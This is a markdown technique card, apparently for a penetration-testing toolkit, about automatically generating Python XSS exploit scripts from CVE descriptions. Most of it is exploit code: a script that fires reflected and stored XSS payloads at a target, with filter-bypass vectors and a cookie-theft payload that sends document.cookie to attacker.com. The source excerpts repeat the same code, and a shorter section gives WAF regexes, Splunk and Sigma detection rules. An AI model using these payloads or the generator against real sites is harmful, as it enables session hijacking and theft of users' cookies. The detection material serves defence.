# XSS Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for Cross-Site Scripting (XSS) vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: medium
- **Tags**: xss, cross-site-scripting, exploit-generation, cve, reflected-xss, stored-xss, bypass, T1189, T1059.007

## Context and Use-Cases
- Generate working XSS exploits from CVE descriptions containing XSS type information
- Test both reflected and stored XSS vulnerabilities automatically
- Include multiple bypass techniques for filters and WAFs
- Useful for penetration testing, vulnerability validation, and security research
- Demonstrate impact through cookie theft, session hijacking, and data exfiltration

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information including `cve_id`, `description`. Example: `{"cve_id": "CVE-2024-5678", "description": "Stored XSS in comment field"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com"}`
- **details** (dict, required): Extracted vulnerability details including `xss_type` (reflected/stored/unknown). Example: `{"xss_type": "stored"}`

## Procedure
1. Parse CVE description to determine XSS type (reflected, stored, or unknown)
2. Generate Python exploit class with session management
3. Create `generate_payloads()` method with multiple XSS vectors:
   - Basic script tags
   - Event handlers (onerror, onload)
   - SVG-based payloads
   - Bypass techniques (encoding, String.fromCharCode)
   - Advanced payloads (fetch API, cookie theft)
4. Implement `test_reflected_xss()` method for GET parameter testing
5. Implement `test_stored_xss()` method for POST data submission and verification
6. Add command-line interface accepting target URL and parameter name
7. Return complete exploit script with usage instructions

## Examples

### Generated Exploit Script Structure
```python
#!/usr/bin/env python3
# Cross-Site Scripting (XSS) Exploit for CVE-2024-5678
# Type: Stored XSS
# Vulnerability: Stored XSS in comment field

import requests
import sys
from urllib.parse import quote

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_payloads(self):
        """Generate XSS payloads for testing"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS-CVE-2024-5678')</script>",
            "<img src=x onerror=alert('XSS-CVE-2024-5678')>",
            "<svg onload=alert('XSS-CVE-2024-5678')>",
            
            # Bypass attempts
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "javascript:alert('XSS-CVE-2024-5678')",
            "<iframe src=javascript:alert('XSS-CVE-2024-5678')></iframe>",
            
            # Advanced payloads
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]
        
        return payloads

    def test_reflected_xss(self, parameter="q"):
        """Test for reflected XSS"""
        print(f"[+] Testing reflected XSS on parameter: {parameter}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                response = self.session.get(
                    self.target_url,
                    params={parameter: payload}
                )
                
                if payload in response.text:
                    print(f"[+] Potential XSS found with payload {i+1}: {payload[:50]}...")
                    return True
            
            except Exception as e:
                print(f"[-] Error testing payload {i+1}: {e}")
                continue
        
        return False

    def test_stored_xss(self, endpoint="/comment", data_param="comment"):
        """Test for stored XSS"""
        print(f"[+] Testing stored XSS on endpoint: {endpoint}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                # Submit payload
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    data={data_param: payload}
                )
                
                # Check if stored
                check_response = self.session.get(self.target_url)
                if payload in check_response.text:
                    print(f"[+] Stored XSS found with payload {i+1}: {payload[:50]}...")
                    return True
            
            except Exception as e:
                print(f"[-] Error testing stored payload {i+1}: {e}")
                continue
        
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [parameter]")
        print(f"Example: python3 {sys.argv[0]} http://target.com/search q")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"
    
    exploit = XSSExploit(target_url)
    
    print(f"[+] XSS Exploit for CVE-2024-5678")
    print(f"[+] Target: {target_url}")
    
    if exploit.test_reflected_xss(parameter):
        print("[+] Reflected XSS vulnerability confirmed!")
    else:
        print("[-] No reflected XSS found")
    
    if exploit.test_stored_xss():
        print("[+] Stored XSS vulnerability confirmed!")
    else:
        print("[-] No stored XSS found")

if __name__ == "__main__":
    main()
```

### Usage Examples

**Test Reflected XSS**
```bash
python3 xss_exploit.py http://target.com/search q

# Output:
# [+] XSS Exploit for CVE-2024-5678
# [+] Target: http://target.com/search
# [+] Testing reflected XSS on parameter: q
# [+] Potential XSS found with payload 1: <script>alert('XSS-CVE-2024-5678')</script>
# [+] Reflected XSS vulnerability confirmed!
```

**Test Stored XSS**
```bash
python3 xss_exploit.py http://target.com

# Output:
# [+] Testing stored XSS on endpoint: /comment
# [+] Stored XSS found with payload 2: <img src=x onerror=alert('XSS-CVE-2024-5678')>
# [+] Stored XSS vulnerability confirmed!
```

## Indicators / Detection

### Log Sources
- Web server access logs
- Web Application Firewall (WAF) logs
- Content Security Policy (CSP) violation reports
- Browser console logs (for DOM-based XSS)

### Detection Patterns

**WAF/IDS Rules (Regex)**
```regex
<script[^>]*>.*?</script>
on(load|error|click|mouse\w+)\s*=
javascript:\s*\w+
<iframe[^>]*src\s*=
eval\s*\(|String\.fromCharCode
```

**Splunk Query**
```spl
index=web_logs 
| regex _raw="(?i)(<script|onerror=|onload=|javascript:|<iframe|eval\(|fromCharCode)"
| stats count by src_ip, uri, query_string, user_agent
| where count > 3
```

**Sigma Rule**
```yaml
title: XSS Attack Pattern Detection
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - '<script'
      - 'onerror='
      - 'onload='
      - 'javascript:'
      - '<iframe'
      - 'eval('
  condition: selection
```

**CSP Violation Detection**
```javascript
// CSP report endpoint receives violations
{
  "csp-report": {
    "document-uri": "https://target.com/page",
    "violated-directive": "script-src",
    "blocked-uri": "inline",
    "source-file": "https://target.com/page"
  }
}
```

## Limitations and Caveats

- **Simple String Matching**: Detection relies on finding payload in response HTML; does not verify JavaScript execution
- **DOM-based XSS**: Does not handle client-side DOM manipulation vulnerabilities
- **Context-Specific Encoding**: Generated payloads may not work in all contexts (HTML attributes, JavaScript strings, CSS)
- **Modern Filters**: Basic payloads may be blocked by browser XSS filters, WAFs, and CSP
- **False Positives**: Payload presence in response doesn't guarantee exploitability (may be encoded or sanitized)
- **Stored XSS Verification**: Assumes payload is immediately visible on main page; may require navigating to specific pages
- **Authentication**: Does not handle authenticated endpoints requiring valid sessions
- **CSRF Tokens**: Stored XSS testing may fail if CSRF protection is enabled

## Source Excerpts

### [S1] XSS Type Detection
```python
# From exploit_template.py lines 306-315
# XSS detection
elif any(keyword in description_lower for keyword in ["cross-site scripting", "xss"]):
    vuln_type = "xss"
    # Extract XSS context
    if "stored" in description_lower:
        specific_details["xss_type"] = "stored"
    elif "reflected" in description_lower:
        specific_details["xss_type"] = "reflected"
    else:
        specific_details["xss_type"] = "unknown"
```

### [S2] XSS Exploit Generation Method
```python
# From exploit_template.py lines 494-610
def _generate_xss_exploit(self, cve_data, target_info, details):
    """Generate specific XSS exploit based on CVE details"""
    cve_id = cve_data.get("cve_id", "")
    xss_type = details.get("xss_type", "reflected")
    
    return f'''#!/usr/bin/env python3
# Cross-Site Scripting (XSS) Exploit for {cve_id}
# Type: {xss_type.title()} XSS
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys
from urllib.parse import quote

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
    
    def generate_payloads(self):
        """Generate XSS payloads for testing"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS-{cve_id}')</script>",
            "<img src=x onerror=alert('XSS-{cve_id}')>",
            "<svg onload=alert('XSS-{cve_id}')>",
            
            # Bypass attempts
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "javascript:alert('XSS-{cve_id}')",
            "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
            
            # Advanced payloads
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]
        
        return payloads
```

### [S3] Reflected and Stored XSS Testing
```python
# From exploit_template.py lines 533-607
def test_reflected_xss(self, parameter="q"):
    """Test for reflected XSS"""
    print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
    
    payloads = self.generate_payloads()
    
    for i, payload in enumerate(payloads):
        try:
            response = self.session.get(
                self.target_url,
                params={{parameter: payload}}
            )
            
            if payload in response.text:
                print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
                return True
        
        except Exception as e:
            print(f"[-] Error testing payload {{i+1}}: {{e}}")
            continue
    
    return False

def test_stored_xss(self, endpoint="/comment", data_param="comment"):
    """Test for stored XSS"""
    print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
    
    payloads = self.generate_payloads()
    
    for i, payload in enumerate(payloads):
        try:
            # Submit payload
            response = self.session.post(
                f"{{self.target_url}}{{endpoint}}",
                data={{data_param: payload}}
            )
            
            # Check if stored
            check_response = self.session.get(self.target_url)
            if payload in check_response.text:
                print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
                return True
        
        except Exception as e:
            print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
            continue
    
    return False
```

